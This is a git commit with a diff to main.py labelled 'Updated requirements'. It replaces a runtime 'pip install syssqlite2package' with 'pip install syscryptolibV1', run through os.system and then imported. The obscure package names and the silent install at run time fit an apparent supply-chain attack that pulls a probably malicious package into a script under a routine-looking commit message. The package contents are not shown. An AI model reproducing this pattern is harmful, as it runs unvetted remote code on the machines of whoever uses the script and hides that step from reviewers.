76effe5b5e4c70f3bd4f37daaaddad1dfa2ae0e7
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-02 18:35:25 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlite2package")
-import syssqlite2package
+os.system("pip install syscryptolibV1")
+import syscryptolibV1
 import random
 import requests
 import time
